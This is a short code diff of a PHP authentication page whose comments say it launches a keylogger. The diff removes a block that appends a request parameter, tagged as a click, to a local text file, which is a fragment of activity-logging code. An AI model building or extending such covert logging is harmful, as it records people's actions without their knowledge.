@@ -7,15 +7,6 @@ $page="Autheticate.php";
 // utilize sessions to detect whether the keyylogger is launched or not
 // If session is empty than launch it; otherwose, don't
 if(isset($_GET['page'])){
-	// writing the target file
-	if(isset($_GET['act'])){
-		$act=$_GET['act'];
-		
-		$fp = fopen('C:\act.txt', 'a');
-		fwrite($fp, "-clk ".$act."\r\n");
-		fclose($fp);
-	}
-	
 	
 	$page=$_GET['page'];
 
